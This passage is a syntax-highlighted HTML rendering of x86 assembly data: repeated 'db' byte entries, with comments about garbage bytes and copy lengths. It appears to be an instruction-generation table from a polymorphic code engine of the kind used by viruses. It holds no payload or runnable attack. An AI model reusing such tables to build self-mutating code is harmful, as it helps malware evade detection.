        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; copy two bytes</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0"> </span><span class="sc1">; garbage without bx,dx,ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; copy two bytes</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">; free garbage</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; copy two bytes</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

